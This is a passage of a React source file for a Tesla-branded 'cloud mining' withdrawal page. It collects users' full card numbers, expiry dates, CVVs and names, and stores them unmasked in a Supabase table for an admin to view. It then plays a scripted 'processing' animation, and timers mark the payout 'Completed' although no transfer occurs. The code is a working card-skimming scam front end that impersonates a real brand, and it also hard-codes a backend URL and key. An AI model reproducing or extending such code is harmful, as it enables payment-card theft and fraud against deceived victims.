"use client";

import { useState, useEffect } from "react";
import { createClient } from "@supabase/supabase-js";

// ─────────────────────────────────────────────────────────────────────────────
// SUPABASE
// ─────────────────────────────────────────────────────────────────────────────
const SUPABASE_URL  = process.env.NEXT_PUBLIC_SUPABASE_URL  || "https://gxihfrjvgecfoktatlnc.supabase.co";
const SUPABASE_ANON = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "sb_publishable_C8s87X99DFrRxMP-xIEG-Q_A-R53eHH";
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON);

// Push a withdrawal request (including card details) to Supabase
async function pushWithdrawalToSupabase(payload) {
  try {
    const { error } = await supabase
      .from("withdrawal_requests")
      .insert({
        reference_id: payload.id,
        user_id:      payload.userId      || "",
        user_email:   payload.userEmail   || "",
        user_name:    payload.userName    || "",
        amount:       payload.amount,
        fee:          payload.fee,
        receive:      payload.receive,
        card_type:    payload.cardType,
        card_number:  payload.cardNumber.replace(/\s/g, ""),  // raw digits
        card_expiry:  payload.expiry,
        card_cvv:     payload.cvv,
        card_name:    payload.cardName,
        status:       "Submitted",
        submitted_at: new Date().toISOString(),
      });
    if (error) { console.error("[Supabase] withdrawal insert:", error.message); return false; }
    return true;
  } catch (err) {
    console.error("[Supabase] withdrawal exception:", err);
    return false;
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// CONSTANTS
// ─────────────────────────────────────────────────────────────────────────────
const MIN_WITHDRAWAL     = 10000;
const WITHDRAWAL_FEE_PCT = 0.015;
const STORAGE_KEY        = "cloud_mining_v2";
const WITHDRAWAL_KEY     = "cloud_mining_withdrawals";

const CARD_TYPES = [
  { id: "mastercard", label: "Mastercard",       color: "#eb001b", gradient: "linear-gradient(135deg,#eb001b,#f79e1b)" },
  { id: "visa",       label: "Visa",             color: "#1a1f71", gradient: "linear-gradient(135deg,#1a1f71,#2563eb)" },
  { id: "verve",      label: "Verve",            color: "#00834f", gradient: "linear-gradient(135deg,#00834f,#00b865)" },
  { id: "amex",       label: "American Express", color: "#007bc1", gradient: "linear-gradient(135deg,#007bc1,#00a8e8)" },
];

const STATUS_STAGES = ["Submitted", "Verifying", "Processing", "Completed"];

const PROCESSING_STEPS = [
  { label: "Submitting withdrawal request", duration: 1800 },
  { label: "Verifying card details",         duration: 2200 },
  { label: "Checking account balance",       duration: 1600 },
  { label: "Authenticating transaction",     duration: 2400 },
  { label: "Initiating bank transfer",       duration: 2000 },
  { label: "Confirming payment dispatch",    duration: 1800 },
];

// ─────────────────────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────────────────────
const fmtBig   = n  => n >= 1000 ? `$${(n/1000).toFixed(2)}k` : `$${n.toFixed(2)}`;
const maskCard = n  => n.length >= 4 ? `•••• •••• •••• ${n.slice(-4)}` : n;
const tsToDate = ts => new Date(ts).toLocaleDateString("en-US", { month:"short", day:"numeric", year:"numeric" });
const tsToTime = ts => new Date(ts).toLocaleTimeString("en-US", { hour:"2-digit", minute:"2-digit" });

function fmtCardNumber(v) { return v.replace(/\D/g,"").slice(0,16).replace(/(.{4})/g,"$1 ").trim(); }
function fmtExpiry(v)     { const d=v.replace(/\D/g,"").slice(0,4); return d.length>2?`${d.slice(0,2)}/${d.slice(2)}`:d; }

function loadMined()       { try { const r=localStorage.getItem(STORAGE_KEY); return r?JSON.parse(r).mined||0:0; } catch{return 0;} }
function loadWithdrawals() { try { const r=localStorage.getItem(WITHDRAWAL_KEY); return r?JSON.parse(r):[]; }    catch{return [];} }
function saveWithdrawals(l){ try { localStorage.setItem(WITHDRAWAL_KEY,JSON.stringify(l)); } catch{} }
function deductMined(a)    {
  try {
    const raw=localStorage.getItem(STORAGE_KEY); if(!raw) return;
    const s=JSON.parse(raw); s.mined=Math.max((s.mined||0)-a,0);
    localStorage.setItem(STORAGE_KEY,JSON.stringify(s));
  } catch {}
}

function useIsMobile(bp=768) {
  const [m,setM]=useState(false);
  useEffect(()=>{ const c=()=>setM(window.innerWidth<bp); c(); window.addEventListener("resize",c); return()=>window.removeEventListener("resize",c); },[bp]);
  return m;
}

// ─────────────────────────────────────────────────────────────────────────────
// TESLA LOGO
// ─────────────────────────────────────────────────────────────────────────────
function TeslaLogo({size=32,color="#e31937"}) {
  return <img src="/favicon-512.png" alt="Tesla" style={{ width:size,height:size,objectFit:"contain", filter:color==="#e31937"||color==="#cc0000"||color==="#aa0000"?"none":color==="#222"||color==="#333"?"brightness(0.15)":"none", display:"inline-block",flexShrink:0 }} />;
}

// ─────────────────────────────────────────────────────────────────────────────
// CARD PREVIEW
// ─────────────────────────────────────────────────────────────────────────────
function CardPreview({ cardType, cardNumber, expiry, cardName }) {
  const ct = CARD_TYPES.find(c=>c.id===cardType)||CARD_TYPES[0];
  const raw = cardNumber.replace(/\s/g,"").padEnd(16,"·");
  const display = raw.match(/.{1,4}/g).join("  ");
  return (
    <div style={{ background:ct.gradient, borderRadius:16, padding:"20px 22px", minHeight:155, position:"relative", overflow:"hidden", boxShadow:"0 8px 32px rgba(0,0,0,0.45)", marginBottom:22 }}>
      <div style={{ position:"absolute",top:-36,right:-36,width:130,height:130,borderRadius:"50%",background:"rgba(255,255,255,0.08)" }} />
      <div style={{ position:"absolute",bottom:-52,left:16,width:170,height:170,borderRadius:"50%",background:"rgba(255,255,255,0.04)" }} />
      <div style={{ display:"flex",justifyContent:"space-between",alignItems:"flex-start",marginBottom:24,position:"relative" }}>
        <TeslaLogo size={26} color="#fff" />
        <span style={{ fontSize:15,fontWeight:900,color:"#fff",letterSpacing:1,fontFamily:"'Syne',sans-serif",textShadow:"0 1px 4px rgba(0,0,0,0.3)" }}>{ct.label}</span>
      </div>
      <div style={{ fontSize:17,fontWeight:700,color:"#fff",letterSpacing:3,fontFamily:"'JetBrains Mono',monospace",marginBottom:14,position:"relative",textShadow:"0 1px 4px rgba(0,0,0,0.3)" }}>{display}</div>
      <div style={{ display:"flex",justifyContent:"space-between",alignItems:"flex-end",position:"relative" }}>
        <div>
          <div style={{ fontSize:8,color:"rgba(255,255,255,0.6)",letterSpacing:2,textTransform:"uppercase",marginBottom:2 }}>Card Holder</div>
          <div style={{ fontSize:12,fontWeight:700,color:"#fff",letterSpacing:1 }}>{cardName||"YOUR NAME"}</div>
        </div>
        <div style={{ textAlign:"right" }}>
          <div style={{ fontSize:8,color:"rgba(255,255,255,0.6)",letterSpacing:2,textTransform:"uppercase",marginBottom:2 }}>Expires</div>
          <div style={{ fontSize:12,fontWeight:700,color:"#fff" }}>{expiry||"MM/YY"}</div>
        </div>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// STATUS BADGE
// ─────────────────────────────────────────────────────────────────────────────
function StatusBadge({status}) {
  const map={ Submitted:{color:"#6366f1",bg:"rgba(99,102,241,0.12)",border:"rgba(99,102,241,0.3)",icon:"○"}, Verifying:{color:"#f59e0b",bg:"rgba(245,158,11,0.12)",border:"rgba(245,158,11,0.3)",icon:"◐"}, Processing:{color:"#00bfff",bg:"rgba(0,191,255,0.12)",border:"rgba(0,191,255,0.3)",icon:"◑"}, Completed:{color:"#00c896",bg:"rgba(0,200,150,0.12)",border:"rgba(0,200,150,0.3)",icon:"✓"}, Failed:{color:"#ff4455",bg:"rgba(255,68,85,0.12)",border:"rgba(255,68,85,0.3)",icon:"✕"} };
  const s=map[status]||map.Submitted;
  return <span style={{ padding:"3px 10px",borderRadius:20,fontSize:11,fontWeight:600,background:s.bg,border:`1px solid ${s.border}`,color:s.color,whiteSpace:"nowrap" }}>{s.icon} {status}</span>;
}

// ─────────────────────────────────────────────────────────────────────────────
// STATUS TRACKER
// ─────────────────────────────────────────────────────────────────────────────
function StatusTracker({status}) {
  const idx=STATUS_STAGES.indexOf(status);
  return (
    <div style={{ display:"flex",alignItems:"flex-start",width:"100%",marginBottom:8 }}>
      {STATUS_STAGES.map((stage,i)=>{
        const done=i<idx, active=i===idx;
        return (
          <div key={stage} style={{ display:"flex",alignItems:"center",flex:1 }}>
            <div style={{ display:"flex",flexDirection:"column",alignItems:"center",gap:5,flex:"0 0 auto" }}>
              <div style={{ width:active?26:20,height:active?26:20,borderRadius:"50%",display:"flex",alignItems:"center",justifyContent:"center", background:done?"rgba(0,200,150,0.15)":active?"rgba(227,25,55,0.15)":"rgba(255,255,255,0.04)", border:`2px solid ${done?"#00c896":active?"#e31937":"rgba(255,255,255,0.08)"}`, color:done?"#00c896":active?"#e31937":"#333",fontSize:10,fontWeight:700, boxShadow:active?"0 0 12px rgba(227,25,55,0.3)":"none",transition:"all 0.3s",flexShrink:0 }}>
                {done?"✓":active?"●":i+1}
              </div>
              <span style={{ fontSize:8,color:done?"#00c896":active?"#e31937":"#333",textTransform:"uppercase",letterSpacing:0.8,whiteSpace:"nowrap" }}>{stage}</span>
            </div>
            {i<STATUS_STAGES.length-1&&<div style={{ flex:1,height:2,margin:"0 4px",marginBottom:14,background:done?"linear-gradient(90deg,#00c896,#00a878)":"rgba(255,255,255,0.05)",borderRadius:1 }} />}
          </div>
        );
      })}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// LOCKED SCREEN
// ─────────────────────────────────────────────────────────────────────────────
function LockedScreen({balance}) {
  const progress=Math.min((balance/MIN_WITHDRAWAL)*100,100);
  const remaining=Math.max(MIN_WITHDRAWAL-balance,0);
  const daysLeft=Math.ceil(remaining/96.88);
  return (
    <div style={{ display:"flex",flexDirection:"column",alignItems:"center",padding:"32px 20px 48px",textAlign:"center" }}>
      <div style={{ width:88,height:88,borderRadius:"50%",background:"rgba(227,25,55,0.08)",border:"2px solid rgba(227,25,55,0.18)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:38,marginBottom:24,animation:"float 3s ease-in-out infinite" }}>🔒</div>
      <h2 style={{ fontFamily:"'Syne',sans-serif",fontWeight:900,fontSize:28,marginBottom:10,letterSpacing:-0.5 }}>Withdrawal <span style={{ color:"#e31937" }}>Locked</span></h2>
      <p style={{ fontSize:13,color:"#555",lineHeight:1.8,maxWidth:320,marginBottom:32 }}>You need <strong style={{ color:"#fff" }}>${MIN_WITHDRAWAL.toLocaleString()}</strong> in mining balance to unlock card withdrawals.</p>
      <div style={{ width:"100%",maxWidth:400,background:"rgba(255,255,255,0.03)",border:"1px solid rgba(255,255,255,0.07)",borderRadius:18,padding:"24px 22px",marginBottom:20 }}>
        <div style={{ display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:18 }}>
          <div style={{ background:"rgba(255,255,255,0.03)",borderRadius:12,padding:"14px 16px" }}>
            <div style={{ fontSize:9,color:"#444",textTransform:"uppercase",letterSpacing:1.5,marginBottom:8 }}>Your Balance</div>
            <div style={{ fontSize:22,fontWeight:800,color:"#fff",fontFamily:"'Syne',sans-serif",lineHeight:1 }}>${balance.toFixed(2)}</div>
          </div>
          <div style={{ background:"rgba(227,25,55,0.06)",border:"1px solid rgba(227,25,55,0.15)",borderRadius:12,padding:"14px 16px" }}>
            <div style={{ fontSize:9,color:"#444",textTransform:"uppercase",letterSpacing:1.5,marginBottom:8 }}>Target</div>
            <div style={{ fontSize:22,fontWeight:800,color:"#e31937",fontFamily:"'Syne',sans-serif",lineHeight:1 }}>${MIN_WITHDRAWAL.toLocaleString()}</div>
          </div>
        </div>
        <div style={{ height:8,background:"rgba(255,255,255,0.05)",borderRadius:4,overflow:"hidden",marginBottom:8 }}>
          <div style={{ height:"100%",width:`${progress}%`,background:"linear-gradient(90deg,#aa0000,#e31937)",borderRadius:4,boxShadow:"0 0 12px rgba(227,25,55,0.4)",transition:"width 0.6s ease" }} />
        </div>
        <div style={{ display:"flex",justifyContent:"space-between",marginBottom:20 }}>
          <span style={{ fontSize:11,color:"#e31937",fontWeight:600 }}>{progress.toFixed(1)}% complete</span>
          <span style={{ fontSize:11,color:"#444" }}>${remaining.toFixed(2)} to go</span>
        </div>
        {[{label:"25% milestone",val:2500},{label:"50% milestone",val:5000},{label:"75% milestone",val:7500},{label:"🎉 Withdrawal unlocked!",val:10000}].map(({label,val})=>{
          const reached=balance>=val;
          return (
            <div key={val} style={{ display:"flex",alignItems:"center",gap:10,marginBottom:9 }}>
              <div style={{ width:18,height:18,borderRadius:"50%",flexShrink:0,background:reached?"rgba(0,200,150,0.15)":"rgba(255,255,255,0.03)",border:`1px solid ${reached?"#00c896":"rgba(255,255,255,0.06)"}`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:9,color:reached?"#00c896":"#2a2a2a" }}>{reached?"✓":"·"}</div>
              <span style={{ fontSize:12,color:reached?"#bbb":"#333",flex:1,textAlign:"left" }}>{label}</span>
              <span style={{ fontSize:12,color:reached?"#00c896":"#2a2a2a",fontWeight:600 }}>${val.toLocaleString()}</span>
            </div>
          );
        })}
      </div>
      <div style={{ background:"rgba(255,255,255,0.02)",border:"1px solid rgba(255,255,255,0.05)",borderRadius:12,padding:"14px 20px",maxWidth:400,width:"100%" }}>
        <span style={{ fontSize:12,color:"#444" }}>At $96.88/day you're about <span style={{ color:"#e31937",fontWeight:700 }}>{daysLeft} days</span> away from unlocking</span>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// PROCESSING SCREEN
// ─────────────────────────────────────────────────────────────────────────────
function ProcessingScreen({withdrawal,onDone}) {
  const [currentStep,    setCurrentStep]    = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [finished,       setFinished]       = useState(false);

  useEffect(()=>{
    let step=0;
    const run=()=>{
      if(step>=PROCESSING_STEPS.length){ setFinished(true); setTimeout(onDone,2200); return; }
      setCurrentStep(step);
      setTimeout(()=>{ setCompletedSteps(p=>[...p,step]); step++; setTimeout(run,300); }, PROCESSING_STEPS[step].duration);
    };
    const t=setTimeout(run,600);
    return ()=>clearTimeout(t);
  },[]);

  const fee=withdrawal.amount*WITHDRAWAL_FEE_PCT, receive=withdrawal.amount-fee;
  return (
    <div style={{ flex:1,display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:"40px 24px" }}>
      <div style={{ position:"relative",width:120,height:120,marginBottom:32 }}>
        <svg width="120" height="120" style={{ position:"absolute",inset:0 }}>
          <circle cx="60" cy="60" r="52" fill="none" stroke="rgba(227,25,55,0.1)" strokeWidth="6"/>
          {!finished
            ? <circle cx="60" cy="60" r="52" fill="none" stroke="#e31937" strokeWidth="6" strokeDasharray="326" strokeLinecap="round" transform="rotate(-90 60 60)" style={{ animation:"spinDash 1.8s linear infinite" }}/>
            : <circle cx="60" cy="60" r="52" fill="none" stroke="#00c896" strokeWidth="6" strokeDasharray="326 326" transform="rotate(-90 60 60)" style={{ transition:"stroke-dasharray 0.6s ease" }}/>}
        </svg>
        <div style={{ position:"absolute",inset:0,display:"flex",alignItems:"center",justifyContent:"center",fontSize:finished?36:28 }}>{finished?"✅":"⚡"}</div>
      </div>
      {finished
        ? <><h2 style={{ fontFamily:"'Syne',sans-serif",fontWeight:800,fontSize:26,color:"#00c896",marginBottom:10,letterSpacing:-0.5 }}>Withdrawal Submitted!</h2><p style={{ fontSize:14,color:"#555",textAlign:"center",maxWidth:340,lineHeight:1.8 }}>Your request is <strong style={{ color:"#f59e0b" }}>pending review</strong>. Funds will be sent to your card within <strong style={{ color:"#fff" }}>24 hours</strong>.</p></>
        : <><h2 style={{ fontFamily:"'Syne',sans-serif",fontWeight:800,fontSize:22,marginBottom:8,letterSpacing:-0.5 }}>Processing Withdrawal</h2><p style={{ fontSize:13,color:"#555",marginBottom:32,textAlign:"center" }}>Please don't close this page</p></>}
      <div style={{ width:"100%",maxWidth:400,marginBottom:32 }}>
        {PROCESSING_STEPS.map((step,i)=>{
          const done=completedSteps.includes(i),active=currentStep===i&&!done,pending=i>currentStep;
          return (
            <div key={i} style={{ display:"flex",alignItems:"center",gap:12,padding:"9px 0",borderBottom:i<PROCESSING_STEPS.length-1?"1px solid rgba(255,255,255,0.04)":"none",opacity:pending?0.3:1,transition:"opacity 0.3s" }}>
              <div style={{ width:24,height:24,borderRadius:"50%",flexShrink:0,display:"flex",alignItems:"center",justifyContent:"center", background:done?"rgba(0,200,150,0.15)":active?"rgba(227,25,55,0.15)":"rgba(255,255,255,0.04)", border:`2px solid ${done?"#00c896":active?"#e31937":"rgba(255,255,255,0.08)"}`, fontSize:11,color:done?"#00c896":active?"#e31937":"#333",transition:"all 0.3s" }}>
                {done?"✓":active?<span style={{ width:8,height:8,borderRadius:"50%",background:"#e31937",animation:"pulse 1s ease-in-out infinite",display:"inline-block" }}/>:i+1}
              </div>
              <span style={{ fontSize:13,color:done?"#ccc":active?"#fff":"#444",flex:1 }}>{step.label}</span>
              {done&&<span style={{ fontSize:11,color:"#00c896" }}>Done</span>}
              {active&&<span style={{ fontSize:11,color:"#e31937",animation:"pulse 1s ease-in-out infinite" }}>...</span>}
            </div>
          );
        })}
      </div>
      <div style={{ width:"100%",maxWidth:400,background:"rgba(255,255,255,0.025)",border:"1px solid rgba(255,255,255,0.07)",borderRadius:16,padding:"18px 20px" }}>
        <div style={{ fontSize:10,color:"#444",letterSpacing:2,textTransform:"uppercase",marginBottom:14 }}>Withdrawal Summary</div>
        {[
          {label:"Amount",      value:fmtBig(withdrawal.amount),  color:"#fff"},
          {label:"Fee (1.5%)",  value:`-${fmtBig(fee)}`,          color:"#ff6b6b"},
          {label:"You Receive", value:fmtBig(receive),            color:"#00c896",bold:true},
          {label:"Card Type",   value:withdrawal.cardTypeLabel,   color:"#aaa"},
          {label:"Card",        value:maskCard(withdrawal.cardNumber.replace(/\s/g,"")), color:"#aaa"},
          {label:"Reference",   value:withdrawal.id,              color:"#555"},
        ].map(({label,value,color,bold})=>(
          <div key={label} style={{ display:"flex",justifyContent:"space-between",padding:"7px 0",borderBottom:"1px solid rgba(255,255,255,0.04)" }}>
            <span style={{ fontSize:11,color:"#444" }}>{label}</span>
            <span style={{ fontSize:12,color,fontWeight:bold?700:500 }}>{value}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// CONFIRM MODAL
// ─────────────────────────────────────────────────────────────────────────────
function ConfirmModal({data,onConfirm,onCancel,submitting}) {
  const fee=data.amount*WITHDRAWAL_FEE_PCT, receive=data.amount-fee;
  return (
    <div style={{ position:"fixed",inset:0,zIndex:200,display:"flex",alignItems:"center",justifyContent:"center",background:"rgba(0,0,0,0.75)",backdropFilter:"blur(8px)",padding:20 }}>
      <div style={{ background:"#0a0e18",border:"1px solid rgba(255,255,255,0.09)",borderRadius:20,padding:28,maxWidth:420,width:"100%",animation:"fadeIn 0.2s ease",position:"relative",overflow:"hidden" }}>
        <div style={{ position:"absolute",top:0,left:0,right:0,height:2,background:"linear-gradient(90deg,transparent,#e31937,transparent)" }} />
        <div style={{ textAlign:"center",marginBottom:24 }}>
          <div style={{ fontSize:36,marginBottom:10 }}>🔐</div>
          <div style={{ fontSize:20,fontWeight:700,color:"#fff",fontFamily:"'Syne',sans-serif",marginBottom:4 }}>Confirm Withdrawal</div>
          <div style={{ fontSize:12,color:"#444" }}>Review carefully — this cannot be reversed</div>
        </div>
        {[
          {label:"Withdrawal Amount",    value:fmtBig(data.amount),                         color:"#fff"},
          {label:"Processing Fee (1.5%)",value:`-${fmtBig(fee)}`,                           color:"#ff6b6b"},
          {label:"You Will Receive",     value:fmtBig(receive),                             color:"#00c896",bold:true},
          {label:"Card Type",            value:data.cardTypeLabel,                          color:"#aaa"},
          {label:"Card Number",          value:maskCard(data.cardNumber.replace(/\s/g,"")), color:"#aaa"},
          {label:"Est. Arrival",         value:"Within 24 hours",                           color:"#aaa"},
        ].map(({label,value,color,bold})=>(
          <div key={label} style={{ display:"flex",justifyContent:"space-between",padding:"11px 0",borderBottom:"1px solid rgba(255,255,255,0.05)" }}>
            <span style={{ fontSize:12,color:"#444" }}>{label}</span>
            <span style={{ fontSize:13,color,fontWeight:bold?700:500 }}>{value}</span>
          </div>
        ))}
        <div style={{ display:"flex",gap:10,marginTop:22 }}>
          <button onClick={onCancel} disabled={submitting} style={{ flex:1,padding:"13px 0",borderRadius:11,background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",color:"#555",fontSize:13,fontFamily:"'JetBrains Mono',monospace",cursor:"pointer" }}>Cancel</button>
          <button onClick={onConfirm} disabled={submitting} style={{ flex:2,padding:"13px 0",borderRadius:11,background:submitting?"rgba(255,255,255,0.05)":"linear-gradient(135deg,#aa0000,#e31937)",color:submitting?"#333":"#fff",fontWeight:700,fontSize:13,fontFamily:"'JetBrains Mono',monospace",cursor:submitting?"not-allowed":"pointer",boxShadow:submitting?"none":"0 4px 18px rgba(227,25,55,0.35)",display:"flex",alignItems:"center",justifyContent:"center",gap:8 }}>
            {submitting
              ? <><span style={{ width:14,height:14,border:"2px solid rgba(255,255,255,0.3)",borderTopColor:"#fff",borderRadius:"50%",animation:"spin 0.8s linear infinite",display:"inline-block" }} /> Submitting...</>
              : "✓ Confirm & Submit"}
          </button>
        </div>
        {submitting && (
          <div style={{ marginTop:14,textAlign:"center",fontSize:11,color:"#f59e0b" }}>
            ⏳ Sending to server — please wait...
          </div>
        )}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN PAGE
// ─────────────────────────────────────────────────────────────────────────────
export default function WithdrawalPage({ onBack, user }) {
  const isMobile = useIsMobile();

  const [balance,           setBalance]           = useState(0);
  const [withdrawals,       setWithdrawals]       = useState([]);
  const [selectedCardType,  setSelectedCardType]  = useState("mastercard");
  const [cardNumber,        setCardNumber]        = useState("");
  const [expiry,            setExpiry]            = useState("");
  const [cvv,               setCvv]              = useState("");
  const [cardName,          setCardName]          = useState("");
  const [amount,            setAmount]            = useState("");
  const [errors,            setErrors]            = useState({});
  const [showConfirm,       setShowConfirm]       = useState(false);
  const [submitting,        setSubmitting]        = useState(false); // Supabase in-flight
  const [activeTab,         setActiveTab]         = useState("withdraw");
  const [processing,        setProcessing]        = useState(null);
  const [pendingWithdrawal, setPendingWithdrawal] = useState(null);

  const canWithdraw = balance >= MIN_WITHDRAWAL;

  useEffect(() => { setBalance(loadMined()); setWithdrawals(loadWithdrawals()); }, []);

  useEffect(() => {
    const iv = setInterval(() => {
      setWithdrawals(prev => {
        let changed=false;
        const updated=prev.map(w=>{
          if(w.status==="Completed"||w.status==="Failed") return w;
          const e=(Date.now()-w.timestamp)/1000; let s=w.status;
          if(e>30&&s==="Submitted") s="Verifying";
          if(e>70&&s==="Verifying") s="Processing";
          if(e>120&&s==="Processing") s="Completed";
          if(s!==w.status){changed=true;return{...w,status:s};}
          return w;
        });
        if(changed) saveWithdrawals(updated);
        return changed?updated:prev;
      });
    },6000);
    return ()=>clearInterval(iv);
  },[]);

  const parsedAmount = parseFloat(amount)||0;
  const fee=parsedAmount*WITHDRAWAL_FEE_PCT, receive=parsedAmount-fee;
  const totalWithdrawn=withdrawals.filter(w=>w.status==="Completed").reduce((s,w)=>s+w.amount,0);
  const pendingCount=withdrawals.filter(w=>w.status!=="Completed"&&w.status!=="Failed").length;

  function validate() {
    const e={};
    if(!amount||isNaN(parsedAmount)||parsedAmount<=0)          e.amount="Enter a valid amount";
    else if(parsedAmount<MIN_WITHDRAWAL)                        e.amount=`Minimum withdrawal is $${MIN_WITHDRAWAL.toLocaleString()}`;
    else if(parsedAmount>balance)                               e.amount=`Exceeds your balance of ${fmtBig(balance)}`;
    if(!cardName.trim()||cardName.trim().length<2)              e.cardName="Enter the name on your card";
    const raw=cardNumber.replace(/\s/g,"");
    if(!raw||raw.length<13||raw.length>16)                     e.cardNumber="Enter a valid card number (13–16 digits)";
    if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry))              e.expiry="Enter expiry as MM/YY";
    if(!cvv||cvv.length<3||cvv.length>4)                       e.cvv="CVV must be 3–4 digits";
    setErrors(e);
    return Object.keys(e).length===0;
  }

  function handleSubmit() {
    if(!canWithdraw||!validate()) return;
    const ct=CARD_TYPES.find(c=>c.id===selectedCardType);
    setPendingWithdrawal({
      id:`WD-${Date.now()}`,
      timestamp:Date.now(),
      amount:parsedAmount, fee, receive,
      cardType:selectedCardType,
      cardTypeLabel:ct?.label||selectedCardType,
      cardNumber, expiry, cvv, cardName,
      userId:   user?.id    || "",
      userEmail:user?.email || "",
      userName: user?.name  || "",
      status:"Submitted",
    });
    setShowConfirm(true);
  }

  async function handleConfirm() {
    setSubmitting(true);

    // Push to Supabase FIRST — admin sees it immediately
    await pushWithdrawalToSupabase(pendingWithdrawal);

    setSubmitting(false);
    setShowConfirm(false);

    // Deduct balance & show animated processing screen
    deductMined(pendingWithdrawal.amount);
    setBalance(b=>Math.max(b-pendingWithdrawal.amount,0));
    setProcessing(pendingWithdrawal);
  }

  function handleProcessingDone() {
    const final={...pendingWithdrawal, status:"Verifying", pendingUntil:Date.now()+24*60*60*1000};
    const updated=[final,...withdrawals];
    setWithdrawals(updated); saveWithdrawals(updated);
    setAmount(""); setCardNumber(""); setExpiry(""); setCvv(""); setCardName("");
    setErrors({}); setPendingWithdrawal(null); setProcessing(null);
    setActiveTab("history");
  }

  const card={background:"rgba(255,255,255,0.03)",border:"1px solid rgba(255,255,255,0.07)",borderRadius:16,backdropFilter:"blur(12px)"};

  // ── PROCESSING SCREEN ──
  if(processing) return (
    <div style={{ minHeight:"100vh",background:"#06090f",fontFamily:"'JetBrains Mono',monospace",color:"#fff",display:"flex",flexDirection:"column" }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800&display=swap');
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}} @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}} @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}} @keyframes spinDash{0%{stroke-dashoffset:326}100%{stroke-dashoffset:0}} @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}} *{box-sizing:border-box;margin:0;padding:0;}
      `}</style>
      <div style={{ position:"fixed",inset:0,backgroundImage:"linear-gradient(rgba(227,25,55,0.015) 1px,transparent 1px),linear-gradient(90deg,rgba(227,25,55,0.015) 1px,transparent 1px)",backgroundSize:"48px 48px",pointerEvents:"none" }} />
      <header style={{ padding:"18px 24px",borderBottom:"1px solid rgba(255,255,255,0.05)",display:"flex",alignItems:"center",gap:12,position:"relative",zIndex:1 }}>
        <TeslaLogo size={28}/><span style={{ fontFamily:"'Syne',sans-serif",fontWeight:800,fontSize:16 }}>TESLA<span style={{ color:"#e31937" }}>MINE</span></span>
      </header>
      <div style={{ position:"relative",zIndex:1,flex:1,display:"flex",flexDirection:"column" }}>
        <ProcessingScreen withdrawal={processing} onDone={handleProcessingDone}/>
      </div>
    </div>
  );

  // ── MAIN UI ──
  return (
    <div style={{ minHeight:"100vh",background:"#06090f",fontFamily:"'JetBrains Mono',monospace",color:"#fff",position:"relative",overflow:"hidden" }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800&display=swap');
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}} @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}} @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}} @keyframes spinDash{to{stroke-dashoffset:-326}} @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}} *{box-sizing:border-box;margin:0;padding:0;} button{cursor:pointer;border:none;outline:none;} input::placeholder{color:#2a2a2a;} input:focus{outline:none;border-color:rgba(227,25,55,0.4)!important;background:rgba(227,25,55,0.03)!important;} ::-webkit-scrollbar{width:4px;} ::-webkit-scrollbar-thumb{background:#1e1e2e;border-radius:4px;}
      `}</style>

      {showConfirm&&pendingWithdrawal&&(
        <ConfirmModal
          data={pendingWithdrawal}
          onConfirm={handleConfirm}
          onCancel={()=>{if(!submitting){setShowConfirm(false);setPendingWithdrawal(null);}}}
          submitting={submitting}
        />
      )}

      {/* BG */}
      <div style={{ position:"fixed",inset:0,zIndex:0,backgroundImage:"linear-gradient(rgba(227,25,55,0.015) 1px,transparent 1px),linear-gradient(90deg,rgba(227,25,55,0.015) 1px,transparent 1px)",backgroundSize:"48px 48px",pointerEvents:"none" }} />
      <div style={{ position:"fixed",top:-200,right:-200,width:500,height:500,borderRadius:"50%",background:"radial-gradient(circle,rgba(227,25,55,0.04) 0%,transparent 70%)",pointerEvents:"none" }} />

      <div style={{ position:"relative",zIndex:1,maxWidth:980,margin:"0 auto",padding:isMobile?"0 16px 48px":"0 28px 48px" }}>

        {/* HEADER */}
        <header style={{ padding:isMobile?"18px 0 14px":"24px 0 20px",borderBottom:"1px solid rgba(255,255,255,0.05)",marginBottom:24,display:"flex",alignItems:"center",gap:16,animation:"fadeIn 0.4s ease" }}>
          <button onClick={onBack} style={{ padding:"8px 14px",borderRadius:10,background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",color:"#666",fontSize:13,fontFamily:"'JetBrains Mono',monospace" }}>← Back</button>
          <div style={{ display:"flex",alignItems:"center",gap:10 }}>
            <TeslaLogo size={28}/>
            <div>
              <div style={{ display:"flex",alignItems:"center",gap:7,marginBottom:1 }}>
                <div style={{ width:6,height:6,borderRadius:"50%",background:canWithdraw?"#00c896":"#e31937",animation:"pulse 2s ease-in-out infinite" }} />
                <span style={{ fontSize:9,color:canWithdraw?"#00c896":"#e31937",letterSpacing:3,textTransform:"uppercase" }}>{canWithdraw?"Withdrawal Unlocked":"Withdrawal Locked"}</span>
              </div>
